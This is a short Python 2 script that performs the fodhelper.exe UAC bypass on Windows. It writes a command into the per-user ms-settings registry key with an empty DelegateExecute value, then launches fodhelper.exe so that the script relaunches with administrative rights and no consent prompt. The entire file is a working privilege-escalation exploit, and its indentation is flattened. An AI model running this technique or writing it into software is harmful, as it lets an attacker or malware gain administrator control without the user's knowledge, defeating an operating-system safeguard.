import os
import sys
import ctypes
import _winreg

CMD = r"C:\Windows\System32\cmd.exe"
FOD_HELPER = r'C:\Windows\System32\fodhelper.exe'
PYTHON_CMD = "python"
REG_PATH = 'Software\Classes\ms-settings\shell\open\command'
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'

def is_running_as_admin():
try:
return ctypes.windll.shell32.IsUserAnAdmin()
except:
return False

def create_reg_key(key, value):
try:
_winreg.CreateKey(_winreg.HKEY_CURRENT_USER, REG_PATH)
registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, REG_PATH, 0, _winreg.KEY_WRITE)
_winreg.SetValueEx(registry_key, key, 0, _winreg.REG_SZ, value)
_winreg.CloseKey(registry_key)
except WindowsError:
raise

def bypass_uac(cmd):
try:
create_reg_key(DELEGATE_EXEC_REG_KEY, '')
create_reg_key(None, cmd)
except WindowsError:
raise

def execute():
if not is_running_as_admin():
print('[!] The script is NOT running with administrative privileges')
print('[+] Trying to bypass the UAC')
try:
current_dir = os.path.dirname(os.path.realpath(__file__)) + '\\' + __file__
cmd = '{} /k {} {}'.format(CMD, PYTHON_CMD, current_dir)
bypass_uac(cmd)
os.system(FOD_HELPER)
sys.exit(0)
except WindowsError:
sys.exit(1)
else:
print('[+] The script is running with administrative privileges!')

if __name__ == '__main__':
execute()